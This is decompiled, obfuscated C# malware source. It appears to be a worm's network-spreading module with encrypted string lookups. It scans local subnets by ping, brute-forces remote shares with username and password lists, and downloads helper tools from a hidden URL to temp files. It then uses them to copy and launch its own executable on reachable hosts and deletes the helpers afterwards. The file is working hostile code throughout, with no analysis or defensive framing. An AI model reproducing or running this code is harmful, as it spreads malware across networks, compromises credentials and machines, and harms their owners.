using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

internal sealed class KDwGvVePkJcTn
{
	private sealed class bZeVBgAsflSFQX
	{
		private sealed class fjLQMQjCecYeCKLx
		{
			public bZeVBgAsflSFQX jrECChwicWP;

			public int dfKEXFBNdmAC;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003Cscanner_003Eb__4(int int_0)
			{
				string text = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367449), string.Concat(getString_0(107367395), jrECChwicWP.wLnfVrianIepQzD, getString_0(107396811), (char)int_0, getString_0(107477703), GwNETUHmlf[dfKEXFBNdmAC], getString_0(107367427), btptjurTUxR[dfKEXFBNdmAC]));
				Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
				if (text.Contains(getString_0(107367365)))
				{
					frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366804), jrECChwicWP.wLnfVrianIepQzD, getString_0(107396811), (char)int_0, getString_0(107477708)));
				}
			}

			static fjLQMQjCecYeCKLx()
			{
				Strings.CreateGetStringDelegate(typeof(fjLQMQjCecYeCKLx));
			}
		}

		public Ping nWXkMaVXuPmzU;

		public PingReply rXyjNCNibHjR;

		public IPAddress wLnfVrianIepQzD;

		public string PDSgkHiguXHX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003Cscanner_003Eb__2(int int_0)
		{
			try
			{
				string text = getString_0(107477751) + int_0;
				nWXkMaVXuPmzU = new Ping();
				rXyjNCNibHjR = nWXkMaVXuPmzU.Send(PDSgkHiguXHX + text, 900);
				if (rXyjNCNibHjR.Status != 0)
				{
					return;
				}
				try
				{
					wLnfVrianIepQzD = IPAddress.Parse(PDSgkHiguXHX + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(wLnfVrianIepQzD);
					if (frAELqEtncDC.FoHxVrzKsk.Contains(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107366796))) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					frAELqEtncDC.pCjGIjTYqWtfL.Add(wLnfVrianIepQzD.ToString());
					try
					{
						if (frAELqEtncDC.SnUyxrzkfX == getString_0(107396950))
						{
							Parallel.For(0, GwNETUHmlf.Count, delegate(int int_0)
							{
								fjLQMQjCecYeCKLx CS_0024_003C_003E8__locals0 = new fjLQMQjCecYeCKLx();
								CS_0024_003C_003E8__locals0.jrECChwicWP = this;
								CS_0024_003C_003E8__locals0.dfKEXFBNdmAC = int_0;
								string text4 = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367446), string.Concat(getString_0(107367392), wLnfVrianIepQzD, getString_0(107367383), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], getString_0(107367424), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
								Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
								if (text4.Contains(getString_0(107367362)))
								{
									frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107366796)));
								}
								Parallel.For(65, 91, delegate(int int_0)
								{
									string text5 = frAELqEtncDC.ZqDdjsAkaF(fjLQMQjCecYeCKLx.getString_0(107367449), string.Concat(fjLQMQjCecYeCKLx.getString_0(107367395), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, fjLQMQjCecYeCKLx.getString_0(107477703), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], fjLQMQjCecYeCKLx.getString_0(107367427), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
									Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
									if (text5.Contains(fjLQMQjCecYeCKLx.getString_0(107367365)))
									{
										frAELqEtncDC.SfYjkJojRKhls(string.Concat(fjLQMQjCecYeCKLx.getString_0(107366804), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, fjLQMQjCecYeCKLx.getString_0(107477708)));
									}
								});
							});
							return;
						}
						string text2 = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367446), string.Concat(getString_0(107367392), wLnfVrianIepQzD, getString_0(107366796)));
						Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
						if (text2.Contains(getString_0(107367362)))
						{
							frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107366796)));
						}
						Parallel.For(65, 91, delegate(int int_0)
						{
							string text3 = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367446), string.Concat(getString_0(107367392), wLnfVrianIepQzD, getString_0(107396808), (char)int_0, getString_0(107477705)));
							Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
							if (text3.Contains(getString_0(107367362)))
							{
								frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107396808), (char)int_0, getString_0(107477705)));
							}
						});
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int int_0)
		{
			fjLQMQjCecYeCKLx CS_0024_003C_003E8__locals0 = new fjLQMQjCecYeCKLx();
			CS_0024_003C_003E8__locals0.jrECChwicWP = this;
			CS_0024_003C_003E8__locals0.dfKEXFBNdmAC = int_0;
			string text = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367446), string.Concat(getString_0(107367392), wLnfVrianIepQzD, getString_0(107367383), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], getString_0(107367424), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
			Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
			if (text.Contains(getString_0(107367362)))
			{
				frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107366796)));
			}
			Parallel.For(65, 91, delegate(int int_0)
			{
				string text2 = frAELqEtncDC.ZqDdjsAkaF(fjLQMQjCecYeCKLx.getString_0(107367449), string.Concat(fjLQMQjCecYeCKLx.getString_0(107367395), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, fjLQMQjCecYeCKLx.getString_0(107477703), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], fjLQMQjCecYeCKLx.getString_0(107367427), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
				Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
				if (text2.Contains(fjLQMQjCecYeCKLx.getString_0(107367365)))
				{
					frAELqEtncDC.SfYjkJojRKhls(string.Concat(fjLQMQjCecYeCKLx.getString_0(107366804), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, fjLQMQjCecYeCKLx.getString_0(107477708)));
				}
			});
		}

		public void _003Cscanner_003Eb__5(int int_0)
		{
			string text = frAELqEtncDC.ZqDdjsAkaF(getString_0(107367446), string.Concat(getString_0(107367392), wLnfVrianIepQzD, getString_0(107396808), (char)int_0, getString_0(107477705)));
			Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
			if (text.Contains(getString_0(107367362)))
			{
				frAELqEtncDC.SfYjkJojRKhls(string.Concat(getString_0(107366801), wLnfVrianIepQzD, getString_0(107396808), (char)int_0, getString_0(107477705)));
			}
		}

		static bZeVBgAsflSFQX()
		{
			Strings.CreateGetStringDelegate(typeof(bZeVBgAsflSFQX));
		}
	}

	private sealed class jJQwEZdiDmzgAT
	{
		public string DzlUfVoNYHr;

		public string bhaEAiVpAux;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107367425)) && !string_0.StartsWith(getString_0(107367420)) && !string_0.StartsWith(getString_0(107367379)) && !string_0.Contains(getString_0(107367379))) || !OoTbwPWmPF(string_0))
			{
				return;
			}
			if (frAELqEtncDC.SnUyxrzkfX == getString_0(107396956))
			{
				for (int i = 0; i < GwNETUHmlf.Count; i++)
				{
					if (frAELqEtncDC.XmcyFZznPVQg)
					{
						if (File.Exists(DzlUfVoNYHr))
						{
							frAELqEtncDC.ZqDdjsAkaF(DzlUfVoNYHr, getString_0(107366807) + string_0 + getString_0(107477725) + GwNETUHmlf[i] + getString_0(107477684) + btptjurTUxR[i] + getString_0(107477675) + Assembly.GetEntryAssembly()!.Location + getString_0(107366046));
						}
					}
					else if (File.Exists(bhaEAiVpAux))
					{
						frAELqEtncDC.ZqDdjsAkaF(bhaEAiVpAux, getString_0(107366807) + string_0 + getString_0(107477725) + GwNETUHmlf[i] + getString_0(107477684) + btptjurTUxR[i] + getString_0(107478154) + Assembly.GetEntryAssembly()!.Location + getString_0(107366046));
					}
				}
			}
			else if (frAELqEtncDC.XmcyFZznPVQg)
			{
				if (File.Exists(DzlUfVoNYHr))
				{
					frAELqEtncDC.ZqDdjsAkaF(DzlUfVoNYHr, getString_0(107366807) + string_0 + getString_0(107478097) + Assembly.GetEntryAssembly()!.Location + getString_0(107366046));
				}
			}
			else if (File.Exists(bhaEAiVpAux))
			{
				frAELqEtncDC.ZqDdjsAkaF(bhaEAiVpAux, getString_0(107366807) + string_0 + getString_0(107478064) + Assembly.GetEntryAssembly()!.Location + getString_0(107366046));
			}
		}

		static jJQwEZdiDmzgAT()
		{
			Strings.CreateGetStringDelegate(typeof(jJQwEZdiDmzgAT));
		}
	}

	public static List<string> NBjPzOQyyONXB;

	public static string TndwrITGJIo;

	public static List<string> GwNETUHmlf;

	public static List<string> btptjurTUxR;

	public static List<string> BMjgXCNxSsrPasvWx;

	public List<string> VbCVjzggeHnfvEw = new List<string>();

	public List<string> VHRSdfRfQaYfqJ = new List<string>();

	public List<string> naaAFxeIRJM = new List<string>();

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1;

	[NonSerialized]
	internal static GetString getString_0;

	public static void NjHcpLENGTICX()
	{
		KDwGvVePkJcTn kDwGvVePkJcTn = cYhODrPHuw();
		List<string> source = kDwGvVePkJcTn.naaAFxeIRJM;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1 = delegate(string string_0)
			{
				string text = string_0.Split(new char[1] { '.' })[0] + getString_0(107477746) + string_0.Split(new char[1] { '.' })[1] + getString_0(107477746) + string_0.Split(new char[1] { '.' })[2];
				if (text.StartsWith(getString_0(107367414)) || text.StartsWith(getString_0(107367409)) || text.StartsWith(getString_0(107367368)) || text.StartsWith(getString_0(107367368)))
				{
					WFrrOqXnaRAjKEp(text);
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1);
	}

	public static void WFrrOqXnaRAjKEp(string string_0)
	{
		bZeVBgAsflSFQX.fjLQMQjCecYeCKLx CS_0024_003C_003E8__locals0 = new bZeVBgAsflSFQX();
		CS_0024_003C_003E8__locals0.PDSgkHiguXHX = string_0;
		Parallel.For(0, 255, delegate(int int_0)
		{
			try
			{
				string text = bZeVBgAsflSFQX.getString_0(107477751) + int_0;
				CS_0024_003C_003E8__locals0.nWXkMaVXuPmzU = new Ping();
				CS_0024_003C_003E8__locals0.rXyjNCNibHjR = CS_0024_003C_003E8__locals0.nWXkMaVXuPmzU.Send(CS_0024_003C_003E8__locals0.PDSgkHiguXHX + text, 900);
				if (CS_0024_003C_003E8__locals0.rXyjNCNibHjR.Status == IPStatus.Success)
				{
					try
					{
						CS_0024_003C_003E8__locals0.wLnfVrianIepQzD = IPAddress.Parse(CS_0024_003C_003E8__locals0.PDSgkHiguXHX + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(CS_0024_003C_003E8__locals0.wLnfVrianIepQzD);
						if (!frAELqEtncDC.FoHxVrzKsk.Contains(string.Concat(bZeVBgAsflSFQX.getString_0(107366801), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107366796))) && !hostEntry.HostName.Contains(Environment.MachineName))
						{
							frAELqEtncDC.pCjGIjTYqWtfL.Add(CS_0024_003C_003E8__locals0.wLnfVrianIepQzD.ToString());
							try
							{
								if (frAELqEtncDC.SnUyxrzkfX == bZeVBgAsflSFQX.getString_0(107396950))
								{
									Parallel.For(0, GwNETUHmlf.Count, delegate(int int_0)
									{
										CS_0024_003C_003E8__locals0 = new bZeVBgAsflSFQX.fjLQMQjCecYeCKLx();
										CS_0024_003C_003E8__locals0.jrECChwicWP = CS_0024_003C_003E8__locals0;
										CS_0024_003C_003E8__locals0.dfKEXFBNdmAC = int_0;
										string text4 = frAELqEtncDC.ZqDdjsAkaF(bZeVBgAsflSFQX.getString_0(107367446), string.Concat(bZeVBgAsflSFQX.getString_0(107367392), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107367383), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], bZeVBgAsflSFQX.getString_0(107367424), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
										Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
										if (text4.Contains(bZeVBgAsflSFQX.getString_0(107367362)))
										{
											frAELqEtncDC.SfYjkJojRKhls(string.Concat(bZeVBgAsflSFQX.getString_0(107366801), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107366796)));
										}
										Parallel.For(65, 91, delegate(int int_0)
										{
											string text5 = frAELqEtncDC.ZqDdjsAkaF(bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107367449), string.Concat(bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107367395), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107477703), GwNETUHmlf[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC], bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107367427), btptjurTUxR[CS_0024_003C_003E8__locals0.dfKEXFBNdmAC]));
											Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
											if (text5.Contains(bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107367365)))
											{
												frAELqEtncDC.SfYjkJojRKhls(string.Concat(bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107366804), CS_0024_003C_003E8__locals0.jrECChwicWP.wLnfVrianIepQzD, bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107396811), (char)int_0, bZeVBgAsflSFQX.fjLQMQjCecYeCKLx.getString_0(107477708)));
											}
										});
									});
								}
								else
								{
									string text2 = frAELqEtncDC.ZqDdjsAkaF(bZeVBgAsflSFQX.getString_0(107367446), string.Concat(bZeVBgAsflSFQX.getString_0(107367392), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107366796)));
									Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
									if (text2.Contains(bZeVBgAsflSFQX.getString_0(107367362)))
									{
										frAELqEtncDC.SfYjkJojRKhls(string.Concat(bZeVBgAsflSFQX.getString_0(107366801), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107366796)));
									}
									Parallel.For(65, 91, delegate(int int_0)
									{
										string text3 = frAELqEtncDC.ZqDdjsAkaF(bZeVBgAsflSFQX.getString_0(107367446), string.Concat(bZeVBgAsflSFQX.getString_0(107367392), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107396808), (char)int_0, bZeVBgAsflSFQX.getString_0(107477705)));
										Thread.Sleep(frAELqEtncDC.tZrxRwzECkVmv);
										if (text3.Contains(bZeVBgAsflSFQX.getString_0(107367362)))
										{
											frAELqEtncDC.SfYjkJojRKhls(string.Concat(bZeVBgAsflSFQX.getString_0(107366801), CS_0024_003C_003E8__locals0.wLnfVrianIepQzD, bZeVBgAsflSFQX.getString_0(107396808), (char)int_0, bZeVBgAsflSFQX.getString_0(107477705)));
										}
									});
								}
								return;
							}
							catch
							{
								return;
							}
						}
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static KDwGvVePkJcTn cYhODrPHuw()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		KDwGvVePkJcTn kDwGvVePkJcTn = new KDwGvVePkJcTn();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int k = 0; k < array3.Length; k++)
						{
							array3[k] = (byte)(addressBytes[k] & addressBytes2[k]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						kDwGvVePkJcTn.VHRSdfRfQaYfqJ.Add(networkInterface.Name);
						kDwGvVePkJcTn.naaAFxeIRJM.Add(iPAddress2.ToString());
						kDwGvVePkJcTn.VbCVjzggeHnfvEw.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return kDwGvVePkJcTn;
	}

	public static void dIbcxmVcIUUR()
	{
		jJQwEZdiDmzgAT CS_0024_003C_003E8__locals0 = new jJQwEZdiDmzgAT();
		frAELqEtncDC.qrsuPIqoJseu();
		List<JemiwWqXHdyktS> list = JemiwWqXHdyktS.xbAiMjYRFPfy();
		foreach (JemiwWqXHdyktS item in list)
		{
			NBjPzOQyyONXB.Add(item.IPAddress);
		}
		if (frAELqEtncDC.pCjGIjTYqWtfL.Count > 0)
		{
			NBjPzOQyyONXB = NBjPzOQyyONXB.Union(frAELqEtncDC.pCjGIjTYqWtfL).ToList();
		}
		CS_0024_003C_003E8__locals0.DzlUfVoNYHr = getString_0(107368946);
		CS_0024_003C_003E8__locals0.bhaEAiVpAux = getString_0(107368946);
		try
		{
			CS_0024_003C_003E8__locals0.DzlUfVoNYHr = NUIdwIQbdze();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.bhaEAiVpAux = fDwHFFlKgbIjr();
		}
		catch
		{
		}
		foreach (JemiwWqXHdyktS item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107367414)) || item2.IPAddress.StartsWith(getString_0(107367409)) || item2.IPAddress.StartsWith(getString_0(107367368)) || item2.IPAddress.Contains(getString_0(107367368)))
				{
					UjDeyeOphr.bCDErukBSZUn(item2.MacAddress, item2.IPAddress, getString_0(107478478));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(NBjPzOQyyONXB, delegate(string string_0)
			{
				if ((string_0.StartsWith(jJQwEZdiDmzgAT.getString_0(107367425)) || string_0.StartsWith(jJQwEZdiDmzgAT.getString_0(107367420)) || string_0.StartsWith(jJQwEZdiDmzgAT.getString_0(107367379)) || string_0.Contains(jJQwEZdiDmzgAT.getString_0(107367379))) && OoTbwPWmPF(string_0))
				{
					if (frAELqEtncDC.SnUyxrzkfX == jJQwEZdiDmzgAT.getString_0(107396956))
					{
						for (int i = 0; i < GwNETUHmlf.Count; i++)
						{
							if (frAELqEtncDC.XmcyFZznPVQg)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.DzlUfVoNYHr))
								{
									frAELqEtncDC.ZqDdjsAkaF(CS_0024_003C_003E8__locals0.DzlUfVoNYHr, jJQwEZdiDmzgAT.getString_0(107366807) + string_0 + jJQwEZdiDmzgAT.getString_0(107477725) + GwNETUHmlf[i] + jJQwEZdiDmzgAT.getString_0(107477684) + btptjurTUxR[i] + jJQwEZdiDmzgAT.getString_0(107477675) + Assembly.GetEntryAssembly()!.Location + jJQwEZdiDmzgAT.getString_0(107366046));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.bhaEAiVpAux))
							{
								frAELqEtncDC.ZqDdjsAkaF(CS_0024_003C_003E8__locals0.bhaEAiVpAux, jJQwEZdiDmzgAT.getString_0(107366807) + string_0 + jJQwEZdiDmzgAT.getString_0(107477725) + GwNETUHmlf[i] + jJQwEZdiDmzgAT.getString_0(107477684) + btptjurTUxR[i] + jJQwEZdiDmzgAT.getString_0(107478154) + Assembly.GetEntryAssembly()!.Location + jJQwEZdiDmzgAT.getString_0(107366046));
							}
						}
					}
					else if (frAELqEtncDC.XmcyFZznPVQg)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.DzlUfVoNYHr))
						{
							frAELqEtncDC.ZqDdjsAkaF(CS_0024_003C_003E8__locals0.DzlUfVoNYHr, jJQwEZdiDmzgAT.getString_0(107366807) + string_0 + jJQwEZdiDmzgAT.getString_0(107478097) + Assembly.GetEntryAssembly()!.Location + jJQwEZdiDmzgAT.getString_0(107366046));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.bhaEAiVpAux))
					{
						frAELqEtncDC.ZqDdjsAkaF(CS_0024_003C_003E8__locals0.bhaEAiVpAux, jJQwEZdiDmzgAT.getString_0(107366807) + string_0 + jJQwEZdiDmzgAT.getString_0(107478064) + Assembly.GetEntryAssembly()!.Location + jJQwEZdiDmzgAT.getString_0(107366046));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.DzlUfVoNYHr))
			{
				File.Delete(CS_0024_003C_003E8__locals0.DzlUfVoNYHr);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.bhaEAiVpAux))
			{
				File.Delete(CS_0024_003C_003E8__locals0.bhaEAiVpAux);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string NUIdwIQbdze()
	{
		if (IntPtr.Size == 8)
		{
			return UjiSMeJRdrhRpR(new Uri(frAELqEtncDC.aTyvnaQgFklB(getString_0(107478489))));
		}
		return UjiSMeJRdrhRpR(new Uri(frAELqEtncDC.aTyvnaQgFklB(getString_0(107478489))));
	}

	public static string fDwHFFlKgbIjr()
	{
		if (IntPtr.Size == 8)
		{
			return UjiSMeJRdrhRpR(new Uri(frAELqEtncDC.aTyvnaQgFklB(getString_0(107477864))));
		}
		return UjiSMeJRdrhRpR(new Uri(frAELqEtncDC.aTyvnaQgFklB(getString_0(107477819))));
	}

	public static bool OoTbwPWmPF(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string UjiSMeJRdrhRpR(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107477746), getString_0(107368946)).Remove(0, 3) + getString_0(107477709);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	private static void _003CNetworkScanner_003Eb__0(string string_0)
	{
		string text = string_0.Split(new char[1] { '.' })[0] + getString_0(107477746) + string_0.Split(new char[1] { '.' })[1] + getString_0(107477746) + string_0.Split(new char[1] { '.' })[2];
		if (text.StartsWith(getString_0(107367414)) || text.StartsWith(getString_0(107367409)) || text.StartsWith(getString_0(107367368)) || text.StartsWith(getString_0(107367368)))
		{
			WFrrOqXnaRAjKEp(text);
		}
	}

	static KDwGvVePkJcTn()
	{
		Strings.CreateGetStringDelegate(typeof(KDwGvVePkJcTn));
		NBjPzOQyyONXB = new List<string>();
		TndwrITGJIo = getString_0(107368946);
		GwNETUHmlf = new List<string>();
		btptjurTUxR = new List<string>();
		BMjgXCNxSsrPasvWx = new List<string>();
	}
}
